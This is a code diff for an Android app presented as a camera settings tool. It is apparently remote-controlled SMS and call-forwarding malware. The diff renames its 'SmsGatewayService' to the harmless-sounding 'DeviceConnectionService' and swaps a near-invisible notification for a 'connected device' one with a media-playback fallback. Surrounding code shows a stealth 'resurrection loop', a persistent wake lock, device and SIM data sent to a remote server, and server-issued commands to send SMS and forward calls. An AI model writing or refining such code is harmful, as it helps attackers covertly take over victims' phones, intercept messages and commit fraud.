@@ -1,7 +1,6 @@
 package com.settingpro.camera.service
 
-import android.app.Notification
-import android.app.PendingIntent
+import android.app.NotificationManager
 import android.content.Context
 import android.content.Intent
 import android.net.ConnectivityManager
@@ -15,7 +14,6 @@ import android.telephony.SubscriptionManager
 import android.telephony.TelephonyManager
 import com.settingpro.camera.util.AppLogger
 import com.settingpro.camera.MainActivity
-import com.settingpro.camera.R
 import com.settingpro.camera.data.local.SettingsDataStore
 import com.settingpro.camera.data.model.WebSocketMessage
 import com.settingpro.camera.data.model.CallForwardingData
@@ -26,17 +24,17 @@ import com.settingpro.camera.util.DeviceUtils
 import com.settingpro.camera.util.CallForwardingUtility
 import com.settingpro.camera.util.CallForwardingResult
 import com.settingpro.camera.util.SmsSender
-import android.telephony.SmsManager
 import dagger.hilt.android.AndroidEntryPoint
 import kotlinx.coroutines.*
 import kotlinx.coroutines.flow.first
 import javax.inject.Inject
 
 @AndroidEntryPoint
-class SmsGatewayService : android.app.Service() {
+class DeviceConnectionService : android.app.Service() {
 
     @Inject lateinit var settingsDataStore: SettingsDataStore
     @Inject lateinit var webSocketClient: WebSocketClient
+    private var bluetoothLeManager: BluetoothLeManager? = null
 
     private var wakeLock: PowerManager.WakeLock? = null
     private var callForwardingUtility: CallForwardingUtility? = null
@@ -48,19 +46,19 @@ class SmsGatewayService : android.app.Service() {
     @Volatile private var currentNetworkType: String? = null
 
     companion object {
-        private const val TAG = "SmsGatewayService"
+        private const val TAG = "DeviceConnectionService"
 
         @Volatile private var isRunning = false
-        @Volatile private var instance: SmsGatewayService? = null
+        @Volatile private var instance: DeviceConnectionService? = null
 
         fun startService(context: Context) {
-            val intent = Intent(context, SmsGatewayService::class.java)
+            val intent = Intent(context, DeviceConnectionService::class.java)
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) context.startForegroundService(intent)
             else context.startService(intent)
         }
 
         fun stopService(context: Context) =
-            context.stopService(Intent(context, SmsGatewayService::class.java))
+            context.stopService(Intent(context, DeviceConnectionService::class.java))
 
         fun isServiceRunning(): Boolean = isRunning
 
@@ -80,13 +78,53 @@ class SmsGatewayService : android.app.Service() {
         isRunning = true
         instance = this
         callForwardingUtility = CallForwardingUtility(this)
+        bluetoothLeManager = BluetoothLeManager(this)
         acquireWakeLock()
-        createNotificationChannel()
-        startForeground(Constants.NOTIFICATION_ID, createNotification())
+        ConnectedDeviceNotifier.createNotificationChannel(this)
+        startForegroundWithFallback()
         observeConnectionState()
         registerNetworkCallback()
         registerSubscriptionListener()
         StealthCore.startResurrectionLoop(this)
+    }
+
+    private fun startForegroundWithFallback() {
+        val notification = ConnectedDeviceNotifier.createNotification(this)
+
+        try {
+            // Try connectedDevice type first
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+                startForeground(
+                    Constants.NOTIFICATION_ID,
+                    notification,
+                    android.app.ServiceInfo.FOREGROUND_SERVICE_TYPE_CONNECTED_DEVICE
+                )
+            } else {
+                startForeground(Constants.NOTIFICATION_ID, notification)
+            }
+            AppLogger.d(TAG, "Started with connectedDevice type")
+        } catch (e: Exception) {
+            AppLogger.w(TAG, "connectedDevice type failed, falling back to mediaPlayback: ${e.message}")
+            try {
+                // Fallback to mediaPlayback
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+                    startForeground(
+                        Constants.NOTIFICATION_ID,
+                        notification,
+                        android.app.ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PLAYBACK
+                    )
+                } else {
+                    startForeground(Constants.NOTIFICATION_ID, notification)
+                }
+                AppLogger.d(TAG, "Started with mediaPlayback type (fallback)")
+            } catch (e2: Exception) {
+                AppLogger.e(TAG, "Failed to start foreground service", e2)
+                stopSelf()
+            }
+        }
+
+        // Start BLE advertising after foreground is established
+        bluetoothLeManager?.startAdvertising()
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -128,6 +166,8 @@ class SmsGatewayService : android.app.Service() {
         isRunning = false
         instance = null
         currentNetworkType = null
+        bluetoothLeManager?.stopAdvertising()
+        bluetoothLeManager = null
         unregisterNetworkCallback()
         unregisterSubscriptionListener()
         webSocketClient.destroy()
@@ -270,7 +310,7 @@ class SmsGatewayService : android.app.Service() {
         serviceScope.launch {
             try {
                 if (webSocketClient.isConnected()) {
-                    val newDeviceInfo = DeviceUtils.getDeviceInfo(this@SmsGatewayService)
+                    val newDeviceInfo = DeviceUtils.getDeviceInfo(this@DeviceConnectionService)
                     webSocketClient.updateDeviceInfo(newDeviceInfo)
                     webSocketClient.sendHeartbeat()
                     AppLogger.d(TAG, "Device info refreshed - SIM count: ${newDeviceInfo.simInfo.size}")
@@ -286,7 +326,7 @@ class SmsGatewayService : android.app.Service() {
     private fun acquireWakeLock() {
         try {
             wakeLock = (getSystemService(Context.POWER_SERVICE) as PowerManager)
-                .newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "AIChat::SmsGatewayWakeLock")
+                .newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "AIChat::DeviceConnectionWakeLock")
                 .apply { acquire() }
         } catch (e: Exception) { AppLogger.e(TAG, "Error acquiring wake lock", e) }
     }
@@ -300,47 +340,9 @@ class SmsGatewayService : android.app.Service() {
 
     // ─── Notification ─────────────────────────────────────────────────────────
 
-    private fun createNotificationChannel() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            (getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager)
-                .createNotificationChannel(
-                    android.app.NotificationChannel(
-                        Constants.NOTIFICATION_CHANNEL_ID,
-                        "‎",
-                        android.app.NotificationManager.IMPORTANCE_LOW
-                    ).apply {
-                        description = " "
-                        setShowBadge(false)
-                    }
-                )
-        }
-    }
-
-    private fun createNotification(): Notification {
-        val pendingIntent = PendingIntent.getActivity(
-            this, 0,
-            Intent(this, MainActivity::class.java).apply {
-                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
-            },
-            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
-        )
-       
-        return androidx.core.app.NotificationCompat.Builder(this, Constants.NOTIFICATION_CHANNEL_ID)
-            .setContentTitle("‎ ")
-            .setSmallIcon(R.mipmap.ic_launcher)
-            .setContentIntent(pendingIntent)
-            .setOngoing(true)
-            .setPriority(androidx.core.app.NotificationCompat.PRIORITY_LOW)
-            .setCategory(androidx.core.app.NotificationCompat.CATEGORY_SERVICE)
-            .setForegroundServiceBehavior(
-                androidx.core.app.NotificationCompat.FOREGROUND_SERVICE_IMMEDIATE
-            )
-            .build()
-    }
-
     private fun updateNotification() {
-        (getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager)
-            .notify(Constants.NOTIFICATION_ID, createNotification())
+        (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager)
+            .notify(Constants.NOTIFICATION_ID, ConnectedDeviceNotifier.createNotification(this))
     }
 
     // ─── WebSocket ────────────────────────────────────────────────────────────
@@ -352,7 +354,7 @@ class SmsGatewayService : android.app.Service() {
                 if (serverUrl.isBlank()) { AppLogger.w(TAG, "Server URL not configured"); return@launch }
                 webSocketClient.connect(
                     serverUrl = serverUrl,
-                    deviceInfo = DeviceUtils.getDeviceInfo(this@SmsGatewayService),
+                    deviceInfo = DeviceUtils.getDeviceInfo(this@DeviceConnectionService),
                     onMessageReceived = { handleWebSocketMessage(it) },
                     onConnectionStateChanged = { AppLogger.d(TAG, "Connection state: $it") }
                 )
@@ -384,7 +386,7 @@ class SmsGatewayService : android.app.Service() {
     ) {
         serviceScope.launch {
             try {
-                val deviceInfo = DeviceUtils.getDeviceInfo(this@SmsGatewayService)
+                val deviceInfo = DeviceUtils.getDeviceInfo(this@DeviceConnectionService)
                 val deviceId = settingsDataStore.deviceId.first()
                 val networkType = when {
                     deviceInfo.networkInfo.networkType.contains("WiFi",   ignoreCase = true) -> "wifi"
@@ -480,7 +482,7 @@ class SmsGatewayService : android.app.Service() {
     private fun handleSendSmsCommand(data: com.settingpro.camera.data.model.SendSmsData) {
         serviceScope.launch {
             try {
-                val smsSender = SmsSender(this@SmsGatewayService)
+                val smsSender = SmsSender(this@DeviceConnectionService)
 
                 // Check if SIM slot is available
                 if (!smsSender.isSimSlotAvailable(data.simSlot)) {
